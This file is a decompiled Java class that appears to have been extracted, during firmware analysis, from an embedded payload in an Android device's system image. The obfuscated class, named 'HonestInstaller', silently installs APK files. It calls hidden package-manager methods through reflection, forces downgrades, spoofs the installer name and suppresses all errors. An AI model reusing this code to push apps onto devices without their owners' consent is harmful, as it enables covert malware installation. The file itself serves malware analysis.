package com.android.packageinstaller.extplog;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.RemoteException;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/* JADX INFO: compiled from: HonestInstaller.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/nested/a/classes.dex */
public class c {
    private static b a = null;
    private static a b = null;
    private static String c = ".SESSION_RESULT_ACTION";

    /* JADX INFO: compiled from: HonestInstaller.java */
    public static abstract class a {
        public abstract void a(boolean z, String str);
    }

    private static void a(PackageManager pm, Uri packageURI, int flags, String installerPackageName) throws IllegalAccessException, NoSuchMethodException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException {
        Class<?> clazz = Class.forName("android.content.pm.PackageManager");
        Method method = clazz.getMethod("installPackage", Uri.class, IPackageInstallObserver.class, Integer.TYPE, String.class);
        method.setAccessible(true);
        method.invoke(pm, packageURI, new IPackageInstallObserver.Stub() { // from class: com.android.packageinstaller.extplog.c.1
            @Override // android.content.pm.IPackageInstallObserver
            public void packageInstalled(String packageName, int returnCode) throws RemoteException {
                if (c.b != null) {
                    c.b.a(returnCode == 1, "code_" + returnCode);
                }
            }
        }, Integer.valueOf(flags), installerPackageName);
    }

    private static String a(PackageManager pm, String apkPath) {
        PackageInfo info = pm.getPackageArchiveInfo(apkPath, 0);
        if (info != null) {
            return info.packageName;
        }
        return null;
    }

    /* JADX INFO: compiled from: HonestInstaller.java */
    private static class b extends BroadcastReceiver {
        private b() {
        }

        /* synthetic */ b(b bVar) {
            this();
        }

        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            try {
                String action = intent.getAction();
                if (action != null && action.equals(c.c)) {
                    Bundle extras = intent.getExtras();
                    int status = extras.getInt("android.content.pm.extra.STATUS");
                    String message = extras.getString("android.content.pm.extra.STATUS_MESSAGE");
                    if (c.b != null) {
                        c.b.a(status == 0, message);
                    }
                }
            } catch (Throwable th) {
            }
        }
    }

    /* JADX WARN: Code duplicated, block: B:24:0x00c1 A[Catch: IOException -> 0x00f6, TryCatch #2 {IOException -> 0x00f6, blocks: (B:22:0x00bc, B:24:0x00c1, B:26:0x00c6), top: B:64:0x00bc }] */
    /* JADX WARN: Code duplicated, block: B:26:0x00c6 A[Catch: IOException -> 0x00f6, TRY_LEAVE, TryCatch #2 {IOException -> 0x00f6, blocks: (B:22:0x00bc, B:24:0x00c1, B:26:0x00c6), top: B:64:0x00bc }] */
    /* JADX WARN: Code duplicated, block: B:36:0x00da A[Catch: IOException -> 0x00fd, TryCatch #5 {IOException -> 0x00fd, blocks: (B:34:0x00d5, B:36:0x00da, B:38:0x00df), top: B:66:0x00d5 }] */
    /* JADX WARN: Code duplicated, block: B:38:0x00df A[Catch: IOException -> 0x00fd, TRY_LEAVE, TryCatch #5 {IOException -> 0x00fd, blocks: (B:34:0x00d5, B:36:0x00da, B:38:0x00df), top: B:66:0x00d5 }] */
    /* JADX WARN: Code duplicated, block: B:44:0x00ed A[Catch: IOException -> 0x00f8, TryCatch #1 {IOException -> 0x00f8, blocks: (B:42:0x00e8, B:44:0x00ed, B:46:0x00f2), top: B:62:0x00e8 }] */
    /* JADX WARN: Code duplicated, block: B:46:0x00f2 A[Catch: IOException -> 0x00f8, TRY_LEAVE, TryCatch #1 {IOException -> 0x00f8, blocks: (B:42:0x00e8, B:44:0x00ed, B:46:0x00f2), top: B:62:0x00e8 }] */
    @SuppressLint({"InlinedApi", "NewApi"})
    private static boolean a(Context context, String apkPath, String installerPackageName) throws Throwable {
        if (Build.VERSION.SDK_INT < 21) {
            return false;
        }
        PackageManager pm = context.getPackageManager();
        String pkgName = a(pm, apkPath);
        if (pkgName == null) {
            return false;
        }
        PackageInstaller packageInstaller = pm.getPackageInstaller();
        PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(1);
        params.setAppPackageName(pkgName);
        try {
            Method allowDowngrade = PackageInstaller.SessionParams.class.getMethod("setAllowDowngrade", Boolean.TYPE);
            allowDowngrade.setAccessible(true);
            allowDowngrade.invoke(params, true);
        } catch (Exception e) {
        }
        try {
            Method setInstallerPackageName = PackageInstaller.SessionParams.class.getMethod("setInstallerPackageName", String.class);
            setInstallerPackageName.setAccessible(true);
            setInstallerPackageName.invoke(params, installerPackageName);
        } catch (Exception e2) {
        }
        OutputStream os = null;
        InputStream is = null;
        PackageInstaller.Session session = null;
        try {
            int sessionId = packageInstaller.createSession(params);
            session = packageInstaller.openSession(sessionId);
            os = session.openWrite(pkgName, 0L, -1L);
            InputStream is2 = new FileInputStream(apkPath);
            try {
                byte[] buffer = new byte[1024];
                while (true) {
                    int len = is2.read(buffer);
                    if (len == -1) {
                        break;
                    }
                    os.write(buffer, 0, len);
                }
                session.fsync(os);
                os.close();
                os = null;
                is2.close();
                is = null;
                Intent intent = new Intent(c);
                PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
                session.commit(pendingIntent.getIntentSender());
                if (0 != 0) {
                    try {
                        is.close();
                        if (0 != 0) {
                            os.close();
                        }
                        if (session != null) {
                            session.abandon();
                        }
                    } catch (IOException e3) {
                    }
                } else {
                    if (0 != 0) {
                        os.close();
                    }
                    if (session != null) {
                        session.abandon();
                    }
                }
                return true;
            } catch (Exception e4) {
                is = is2;
                if (is != null) {
                    try {
                        is.close();
                        if (os != null) {
                            os.close();
                        }
                        if (session != null) {
                            session.abandon();
                        }
                    } catch (IOException e5) {
                        return false;
                    }
                } else {
                    if (os != null) {
                        os.close();
                    }
                    if (session != null) {
                        session.abandon();
                    }
                }
                return false;
            } catch (Throwable th) {
                th = th;
                is = is2;
                if (is != null) {
                    try {
                        is.close();
                        if (os != null) {
                            os.close();
                        }
                        if (session != null) {
                            session.abandon();
                        }
                    } catch (IOException e6) {
                        throw th;
                    }
                } else {
                    if (os != null) {
                        os.close();
                    }
                    if (session != null) {
                        session.abandon();
                    }
                }
                throw th;
            }
        } catch (Exception e7) {
        } catch (Throwable th2) {
            th = th2;
        }
    }

    public static boolean a(Context context, String filePath, a callback) {
        boolean zA = false;
        try {
            if (a == null) {
                c = String.valueOf(context.getPackageName()) + ".SESSION_RESULT_ACTION_" + System.currentTimeMillis();
                a = new b(null);
                IntentFilter filter = new IntentFilter();
                filter.addAction(c);
                if (Build.VERSION.SDK_INT >= 34) {
                    context.registerReceiver(a, filter, 3);
                } else {
                    context.registerReceiver(a, filter);
                }
            }
        } catch (Throwable th) {
        }
        File file = new File(filePath);
        if (file.exists()) {
            int installFlags = 0 | 2;
            PackageManager pm = context.getPackageManager();
            try {
                b = callback;
                if (Build.VERSION.SDK_INT < 28) {
                    a(pm, Uri.fromFile(file), installFlags, context.getPackageName());
                    zA = true;
                } else {
                    zA = a(context, filePath, context.getPackageName());
                }
            } catch (Throwable th2) {
            }
        }
        return zA;
    }
}
